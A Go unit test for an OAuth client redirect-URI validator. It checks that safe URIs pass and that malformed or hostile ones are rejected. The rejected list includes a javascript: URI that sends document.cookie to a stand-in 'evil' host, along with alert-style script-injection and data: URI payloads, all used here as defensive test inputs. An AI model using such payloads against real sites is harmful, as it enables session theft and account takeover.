package oauth

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestValidateClientRedirectURIs(t *testing.T) {
	ok := []string{
		"https://app.example.com/callback",
		"http://localhost:8080/cb",
		"com.example.app://callback",
	}
	bad := []string{
		"javascript:fetch('//evil/'+document.cookie)//",
		"JavaScript:alert(1)",
		"data:text/html,<script>alert(1)</script>",
		"vbscript:x",
		"/relative/path",
		"https://app.example.com/*",
		"https://app.example.com/cb#frag",
	}

	for _, u := range ok {
		assert.NoError(t, validateClientRedirectURIs([]string{u}), u)
	}
	for _, u := range bad {
		assert.Error(t, validateClientRedirectURIs([]string{u}), u)
	}
}
